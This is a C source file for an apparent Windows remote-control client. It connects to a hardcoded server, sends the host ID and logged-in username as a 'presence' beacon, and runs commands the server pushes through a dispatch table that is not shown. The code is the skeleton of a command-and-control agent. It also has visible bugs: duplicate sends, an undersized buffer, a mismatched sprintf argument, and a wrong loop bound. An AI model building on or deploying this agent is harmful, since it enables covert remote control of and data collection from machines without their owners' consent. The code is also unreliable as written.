#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <winsock2.h>
#include "common.h"
#include "cmd.h"

static SOCKET mainSock;
static HANDLE clientThread;

void sendPacket(Packet * packet, uint16_t length, const uint8_t * data)
{
    printf("[*] Sending packet...\n");

    packet->length = length;

    if (length > 0)
    {
        uint16_t bytes = sizeof(Packet) + length;
        uint8_t * buffer = malloc(bytes);
        memcpy(&buffer[0], packet, sizeof(Packet));
        memcpy(&buffer[sizeof(Packet)], data, length);

        send(mainSock, (char*) buffer, bytes, 0);

        free(buffer);
    }
    else
    {
        send(mainSock, (char *) packet, sizeof(Packet), 0);
    }

    if (length > 0)
    {
        send(mainSock, (char *) data, length, 0);
    }

    printf("[+] Sent packet: size=%d\n", sizeof(Packet) + packet->length);
}

void initPacket(Packet * packet, uint8_t type, uint16_t rid)
{
	packet->version = VERSION;
	packet->type    = type;
	packet->rid     = rid;
	packet->code    = 0;
	packet->length  = 0;
}

void sendStatus(uint16_t rid, uint16_t code, const uint8_t * data)
{
    Packet packet;
    initPacket(&packet, PT_CMD_STATUS, rid);
    sendPacket(&packet, strlen((char*) data), data);

    printf("[+] Status packet sent.\n");
}

void sendResponse(uint16_t rid, uint16_t code, const uint8_t * data)
{
    Packet packet;
    initPacket(&packet, PT_RESPONSE, rid);
    sendPacket(&packet, strlen((char*) data), data);

    printf("[+] Response packet sent.\n");
}

void sendPresence(void)
{
    uint64_t id = getHostId();

    TCHAR user[256];
    DWORD len = sizeof(user);
    GetUserName(user, &len);
    printf("username: %s\n", user);
    --len;

    uint8_t * data = malloc(8 + len - 1);
    sprintf(data, "%08x", id, user);
    strncat(data, user, len);

    Packet packet;
	initPacket(&packet, PT_PRESENCE, 0);
	sendPacket(&packet, 8 + len, data);

	printf("[+] Presence packet sent (size=%d).\n", 8 + len);
}

void sendPong(void)
{
    Packet packet;
    initPacket(&packet, PT_PONG, 0);
    sendPacket(&packet, 0, NULL);

    printf("[+] Pong sent.\n");
}

bool processCommand(Command * command, Response * response)
{
    int i = 0;

    for (; i < sizeof(commands); i++)
    {
        if (commands[i].command == command->type)
        {
            commands[i].callback(command, response);
            return true;
        }
    }

    return false;
}

void processRequest(uint16_t id, uint8_t command, uint16_t length, uint8_t * data)
{
    printf("request: command=0x%04x rid=%d data='%s'\n", command, id, data);

    uint8_t * args = NULL;
    uint8_t **argv = NULL;

    if (length > 0)
    {
        args = malloc(length + 1);
        memcpy(args, data, length);
        args[length] = '\0';

        int i = 0;
        int count = 1;

        for (i = 0; i < length; i++)
        {
            if (data[i] == '\0')
            {
                count++;
            }
            else
            {
                continue;
            }
        }

        argv = calloc(count, sizeof(void *));
        int index = 0;

        printf("args: %d\n", count);

        while (count--)
        {
            argv[index++] = args;
            printf("arg: %s\n", args);
            while (*args++);
        }
    }

    Command cmd;
    cmd.args = argv;
    cmd.rid = id;
    cmd.type = command;

    Response response;
    response.rid = id;

    processCommand(&cmd, &response);

    if (argv != NULL)
    {
        free(args);
        free(argv);
    }
}

void processPacket(Packet *packet, uint16_t length, uint8_t * data)
{
	printf("%04x %d %04x %d %d\ndata: %s\n", packet->version, packet->type, packet->command, packet->rid, packet->length, data);

	switch(packet->type)
	{
    case PT_REQUEST:
        processRequest(packet->rid, packet->command, packet->length, data);
        break;
    case PT_WELCOME:
        puts("received WELCOME packet.");
        break;
    case PT_PING:
        puts("received PING");
        sendPong();
        break;
	}
}

bool connectToServer(void)
{
    struct sockaddr_in server_addr;
	memset((char*) &server_addr, '\0', sizeof(server_addr));
	server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(1111);
    server_addr.sin_addr.s_addr = inet_addr("192.168.2.240");

	if (connect(mainSock, (SOCKADDR*) &server_addr, sizeof(server_addr)) == SOCKET_ERROR)
	{
		return false;
	}

	return true;
}


DWORD __stdcall ClientThread(void *ptr)
{
    if (! connectToServer())
    {
        printf("[-] Cannot connect to the server.\n");
    }

	sendPresence();

	for(;;)
	{
		Packet buff;
		uint8_t data[1024];
		size_t bytes;

		bytes = recv(mainSock, (char*)&buff, sizeof(buff), 0);
		if (bytes <= 0)
		{
			break;
		}

		memset(data, 0, sizeof(data));
		if (buff.length > 0)
		{
			bytes = recv(mainSock, (char *) data, (buff.length < sizeof(data)) ? buff.length : sizeof(data), 0);
		}

		processPacket(&buff, buff.length, data);
	}

    printf("[*] Connection closed.\n");
}

int main(void)
{
    puts("[*] Initializing WSA...");
	WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != NO_ERROR)
	{
		puts("[-] Cannot initialize WSA.");
		return 1;
	}

    puts("[*] Creating socket...");
	mainSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (mainSock == INVALID_SOCKET)
	{
		puts("[-] Cannot create socket.");
		return 1;
	}

	clientThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ClientThread, NULL, 0, NULL);
    WaitForSingleObject(clientThread, INFINITE);

	return 0;
}


